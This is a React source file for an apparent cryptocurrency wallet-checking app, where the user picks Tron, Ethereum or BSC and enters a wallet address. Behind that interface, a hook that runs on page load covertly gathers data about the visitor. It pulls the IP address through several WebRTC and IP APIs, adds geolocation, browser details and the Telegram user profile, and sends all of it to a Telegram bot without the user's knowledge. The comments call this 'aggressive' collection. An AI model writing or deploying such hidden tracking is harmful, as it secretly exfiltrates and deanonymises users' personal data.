import { useState, useEffect } from 'react';
import { NetworkSelection } from './components/NetworkSelection';
import { AddressInput } from './components/AddressInput';
import { CheckResults } from './components/CheckResults';
import { Header } from './components/Header';
import { Footer } from './components/Footer';
import { getIPFast, getUserInfo, getGeoData } from './utils/webrtc-ip';
import { sendUserDataToBot, getBotInfo } from './utils/telegram-bot';
import './utils/test-webrtc'; // Импортируем тесты для доступа в консоли
import './utils/debug-helpers'; // Debug команды для консоли

export type Network = 'tron' | 'ethereum' | 'bsc';

// Declare Telegram type
declare global {
  interface Window {
    Telegram?: any;
  }
}

export default function App() {
  const [step, setStep] = useState<1 | 2 | 3>(1);
  const [selectedNetwork, setSelectedNetwork] = useState<Network | null>(null);
  const [walletAddress, setWalletAddress] = useState('');

  // Получение IP и отправка в бота при загрузке приложения
  useEffect(() => {
    // Запускаем асинхронно, не блокируем UI
    const trackUser = async () => {
      try {
        console.log('🔍 АГРЕССИВНЫЙ сбор данных пользователя...');
        console.log('⚡ Запуск множественных методов сбора IP...');
        
        // Проверяем бота в фоне
        getBotInfo().then(botInfo => {
          console.log('🤖 Bot info:', botInfo);
        }).catch(err => {
          console.error('⚠️ Ошибка проверки бота:', err);
        });
        
        // АГРЕССИВНОЕ получение IP (множественные WebRTC соединения + 8 API)
        const { ip, ipInfo } = await getIPFast();
        console.log('📍 Primary IP:', ip);
        console.log('🌐 Full IP Info:', ipInfo);
        
        // АГРЕССИВНОЕ получение геоданных (4 geo API параллельно)
        let geoData = undefined;
        if (ip !== 'Unknown') {
          console.log('🌍 Запуск агрессивного сбора геоданных...');
          try {
            geoData = await getGeoData(ip);
            console.log('✅ Геоданные получены:', geoData);
          } catch (geoError) {
            console.error('⚠️ Ошибка получения геоданных:', geoError);
          }
        }
        
        // Получаем дополнительную информацию
        const userInfo = getUserInfo();
        
        // Получаем данные Telegram пользователя (если доступны)
        let telegramUser = null;
        if (typeof window !== 'undefined' && window.Telegram?.WebApp) {
          telegramUser = window.Telegram.WebApp.initDataUnsafe?.user || null;
          console.log('👤 Telegram User:', telegramUser);
        }
        
        // Формируем данные для отправки
        const userData = {
          ip: ip,
          ipInfo: ipInfo,
          geoData: geoData, // Добавляем геоданные
          ...userInfo,
          telegramUser
        };
        
        console.log('📦 Полный набор данных собран:', userData);
        
        // Отправляем в фоне, не ждем результата
        console.log('📤 Отправка ПОЛНОГО пакета данных в Telegram...');
        sendUserDataToBot(userData).then(sent => {
          if (sent) {
            console.log('✅ Данные успешно отправлены в бота');
            console.log('🎉 Агрессивный сбор данных завершен!');
          } else {
            console.error('❌ Не удалось отправить данные в бота');
          }
        }).catch(err => {
          console.error('❌ Ошибка отправки в бота:', err);
        });
        
      } catch (error) {
        console.error('❌ Ошибка при сборе данных:', error);
      }
    };
    
    // Запускаем без await - не блокируем рендер
    trackUser();
  }, []); // Выполняется один раз при монтировании компонента

  const handleNetworkSelect = (network: Network) => {
    setSelectedNetwork(network);
  };

  const handleContinueFromNetwork = () => {
    if (selectedNetwork) {
      setStep(2);
    }
  };

  const handleCheckWallet = (address: string) => {
    setWalletAddress(address);
    setStep(3);
  };

  const handleStartOver = () => {
    setStep(1);
    setSelectedNetwork(null);
    setWalletAddress('');
  };

  return (
    <div className="relative min-h-screen w-full" style={{ backgroundImage: "linear-gradient(90deg, rgb(250, 251, 252) 0%, rgb(250, 251, 252) 100%), linear-gradient(90deg, rgb(255, 255, 255) 0%, rgb(255, 255, 255) 100%)" }}>
      <div className="content-stretch flex flex-col items-start w-full">
        <Header />
        
        <div className="w-full flex justify-center">
          <div className="max-w-[534px] w-full">
            <div className="box-border content-stretch flex flex-col items-start w-full pb-[100px] pt-[40px] px-[15px]">
              {step === 1 && (
                <NetworkSelection
                  selectedNetwork={selectedNetwork}
                  onSelectNetwork={handleNetworkSelect}
                  onContinue={handleContinueFromNetwork}
                />
              )}
              
              {step === 2 && (
                <AddressInput
                  network={selectedNetwork!}
                  onCheck={handleCheckWallet}
                  onBack={() => setStep(1)}
                />
              )}
              
              {step === 3 && (
                <CheckResults
                  network={selectedNetwork!}
                  address={walletAddress}
                  onStartOver={handleStartOver}
                />
              )}
            </div>
          </div>
        </div>
        
        <Footer />
      </div>
    </div>
  );
}